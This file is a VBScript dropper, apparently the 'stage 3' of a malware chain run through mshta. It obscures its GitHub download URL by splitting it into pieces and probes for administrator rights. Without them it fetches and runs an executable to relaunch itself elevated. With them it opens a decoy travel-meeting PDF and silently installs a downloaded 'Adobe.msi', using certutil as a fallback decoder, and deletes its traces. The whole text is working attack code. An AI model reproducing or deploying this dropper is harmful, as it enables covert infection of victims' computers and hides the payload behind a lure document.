Dim fso, sh, qs, selfPath, isAdmin, http, stream, dbg
Dim p1, p2, p3, p4, p5
Dim msiUrl, msiPath, pdfUrl, pdfPath, tmpExe, icuUrl, logFile

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
qs  = Chr(34)

logFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\s3_debug.txt"
Set dbg = fso.OpenTextFile(logFile, 8, True)
dbg.WriteLine "=================================================="
dbg.WriteLine "STAGE3 DEBUG - " & Now
dbg.WriteLine "=================================================="

p1 = "https://raw.g"
p2 = "ithubuserco"
p3 = "ntent.com/rotalbilly5"
p4 = "-sketch/Dream/"
p5 = "main/"
dbg.WriteLine "[URL] base = " & p1 & p2 & p3 & p4 & p5

selfPath = location.href
selfPath = Replace(selfPath, "file:///", "")
selfPath = Replace(selfPath, "%20", " ")
selfPath = Replace(selfPath, "/", "\")
dbg.WriteLine "[SELF] selfPath = " & selfPath

' --- admin probe ---
dbg.WriteLine "[PROBE] running whoami /groups..."
isAdmin = False
Dim tmpOut, fIn, contents
tmpOut = sh.ExpandEnvironmentStrings("%TEMP%") & "\_p.txt"
On Error Resume Next
sh.Run "%COMSPEC% /c whoami /groups > " & qs & tmpOut & qs, 0, True
If Err.Number <> 0 Then
    dbg.WriteLine "[PROBE] whoami Run err: " & Err.Number & " - " & Err.Description
    Err.Clear
End If
On Error GoTo 0

If fso.FileExists(tmpOut) Then
    Set fIn = fso.OpenTextFile(tmpOut, 1)
    contents = fIn.ReadAll
    fIn.Close
    If InStr(contents, "S-1-16-12288") > 0 Then isAdmin = True
    fso.DeleteFile tmpOut, True
    dbg.WriteLine "[PROBE] isAdmin = " & isAdmin
Else
    dbg.WriteLine "[PROBE] whoami output file NOT FOUND"
End If
Err.Clear

' ============================================================
'  NOT ADMIN - fire icu.exe via .bat intermediate
' ============================================================
If Not isAdmin Then
    dbg.WriteLine "[BRANCH] NOT ADMIN - firing icu.exe"

    tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
    icuUrl = p1 & p2 & p3 & p4 & p5 & "icu.exe"
    dbg.WriteLine "[ICU] url  = " & icuUrl
    dbg.WriteLine "[ICU] dest = " & tmpExe

    On Error Resume Next
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", icuUrl, False
    http.Send
    If Err.Number <> 0 Then
        dbg.WriteLine "[ICU] http err: " & Err.Number & " - " & Err.Description
        Err.Clear
    End If
    On Error GoTo 0

    dbg.WriteLine "[ICU] http status: " & http.Status
    dbg.WriteLine "[ICU] http body  : " & LenB(http.ResponseBody) & " bytes"

    If http.Status = 200 Then
        On Error Resume Next
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile tmpExe, 2
        If Err.Number <> 0 Then
            dbg.WriteLine "[ICU] save err: " & Err.Number & " - " & Err.Description
            Err.Clear
        End If
        stream.Close
        On Error GoTo 0
    End If

    If fso.FileExists(tmpExe) Then
        dbg.WriteLine "[ICU] saved: " & fso.GetFile(tmpExe).Size & " bytes"

        ' ---- write intermediate .bat ----
        Dim batPath, batContent, bf, shortBat
        batPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat"
        batContent = "@echo off" & vbCrLf & "start """" /min mshta.exe """ & selfPath & """" & vbCrLf
        dbg.WriteLine "[BAT] writing: " & batPath
        dbg.WriteLine "[BAT] content: " & Replace(batContent, vbCrLf, " || ")

        On Error Resume Next
        Set bf = fso.CreateTextFile(batPath, True)
        bf.Write batContent
        bf.Close
        If Err.Number <> 0 Then
            dbg.WriteLine "[BAT] write err: " & Err.Number & " - " & Err.Description
            Err.Clear
        End If
        On Error GoTo 0

        If fso.FileExists(batPath) Then
            ' get 8.3 short path (removes spaces)
            On Error Resume Next
            shortBat = fso.GetFile(batPath).ShortPath
            If Err.Number <> 0 Then
                dbg.WriteLine "[BAT] short path err: " & Err.Number & " - " & Err.Description
                shortBat = batPath
                Err.Clear
            End If
            On Error GoTo 0
            dbg.WriteLine "[BAT] short path: " & shortBat

            ' ---- run icu.exe with the .bat path (single arg) ----
            Dim runCmd
            runCmd = qs & tmpExe & qs & " m4a1_dev4 " & qs & shortBat & qs
            dbg.WriteLine "[ICU] running: " & runCmd

            On Error Resume Next
            sh.Run runCmd, 0, False
            If Err.Number <> 0 Then
                dbg.WriteLine "[ICU] run err: " & Err.Number & " - " & Err.Description
                Err.Clear
            Else
                dbg.WriteLine "[ICU] run returned - icu should be elevating now"
            End If
            On Error GoTo 0

            ' deferred cleanup of the .bat
            sh.Run "%COMSPEC% /c timeout /t 30 /nobreak >nul & del /f /q """ & batPath & """", 0, False
        Else
            dbg.WriteLine "[BAT] FAILED - bat not on disk"
        End If
    Else
        dbg.WriteLine "[ICU] FAILED - icu.exe not on disk"
    End If

    dbg.WriteLine "=== END (unelevated) ==="
    dbg.Close

' ============================================================
'  ADMIN - do the payload
' ============================================================
Else
    dbg.WriteLine "[BRANCH] ADMIN - proceeding with payload"

    tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
    On Error Resume Next
    If fso.FileExists(tmpExe) Then
        fso.DeleteFile tmpExe, True
        dbg.WriteLine "[CLEANUP] deleted " & tmpExe
    End If
    ' also clean up the .bat if present
    If fso.FileExists(sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat") Then
        fso.DeleteFile sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat", True
        dbg.WriteLine "[CLEANUP] deleted r.bat"
    End If
    Err.Clear
    On Error GoTo 0

    ' ---- PDF ----
    dbg.WriteLine "[PDF] starting"
    pdfUrl  = p1 & p2 & p3 & p4 & p5 & "Travel-Meeting-Plan-Q4-2026.pdf"
    pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
    dbg.WriteLine "[PDF] url  = " & pdfUrl
    dbg.WriteLine "[PDF] dest = " & pdfPath

    On Error Resume Next
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", pdfUrl, False
    http.Send
    If Err.Number <> 0 Then
        dbg.WriteLine "[PDF] http err: " & Err.Number & " - " & Err.Description
        Err.Clear
    End If
    On Error GoTo 0
    dbg.WriteLine "[PDF] status: " & http.Status
    dbg.WriteLine "[PDF] body  : " & LenB(http.ResponseBody) & " bytes"

    If http.Status = 200 Then
        On Error Resume Next
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile pdfPath, 2
        If Err.Number <> 0 Then
            dbg.WriteLine "[PDF] save err: " & Err.Number & " - " & Err.Description
            Err.Clear
        End If
        stream.Close
        On Error GoTo 0
        If fso.FileExists(pdfPath) Then
            dbg.WriteLine "[PDF] saved: " & fso.GetFile(pdfPath).Size & " bytes"
            sh.Run "msedge.exe """ & pdfPath & """", 1, False
            dbg.WriteLine "[PDF] opened in Edge"
        Else
            dbg.WriteLine "[PDF] save FAILED"
        End If
    End If

    ' ---- MSI ----
    dbg.WriteLine "[MSI] starting"
    msiUrl  = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
    msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
    dbg.WriteLine "[MSI] url  = " & msiUrl
    dbg.WriteLine "[MSI] dest = " & msiPath

    On Error Resume Next
    If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", msiUrl, False
    http.Send
    If Err.Number <> 0 Then
        dbg.WriteLine "[MSI] http err: " & Err.Number & " - " & Err.Description
        Err.Clear
    End If
    On Error GoTo 0
    dbg.WriteLine "[MSI] status: " & http.Status
    dbg.WriteLine "[MSI] body  : " & LenB(http.ResponseBody) & " bytes"

    If http.Status = 200 Then
        Dim saved
        saved = False

        On Error Resume Next
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile msiPath, 2
        If Err.Number <> 0 Then
            dbg.WriteLine "[MSI] direct save err: " & Err.Number & " - " & Err.Description
            Err.Clear
        End If
        stream.Close
        On Error GoTo 0

        If fso.FileExists(msiPath) Then
            dbg.WriteLine "[MSI] direct save OK: " & fso.GetFile(msiPath).Size & " bytes"
            saved = True
        Else
            dbg.WriteLine "[MSI] direct save FAILED - certutil fallback"
            Dim b64Path, fh, xmlDoc, binNode, b64Text
            b64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.b64"
            On Error Resume Next
            Set xmlDoc = CreateObject("MSXML2.DOMDocument")
            Set binNode = xmlDoc.createElement("b")
            binNode.dataType = "bin.base64"
            binNode.nodeTypedValue = http.ResponseBody
            b64Text = binNode.text
            Err.Clear
            On Error GoTo 0
            If b64Text <> "" Then
                dbg.WriteLine "[MSI] b64 len: " & Len(b64Text)
                Set fh = fso.CreateTextFile(b64Path, True)
                fh.Write b64Text
                fh.Close
                sh.Run "%COMSPEC% /c certutil.exe -decode """ & b64Path & """ """ & msiPath & """", 0, True
                If fso.FileExists(msiPath) Then
                    dbg.WriteLine "[MSI] certutil OK: " & fso.GetFile(msiPath).Size & " bytes"
                    saved = True
                Else
                    dbg.WriteLine "[MSI] certutil FAILED"
                End If
                On Error Resume Next
                fso.DeleteFile b64Path, True
                Err.Clear
                On Error GoTo 0
            End If
        End If

        If saved Then
            dbg.WriteLine "[MSI] launching msiexec"
            sh.Run "msiexec.exe /i """ & msiPath & """ /qn /norestart", 0, False
            dbg.WriteLine "[MSI] msiexec spawned"
        End If
    End If

    dbg.WriteLine "=== END (elevated) ==="
    dbg.Close
End If
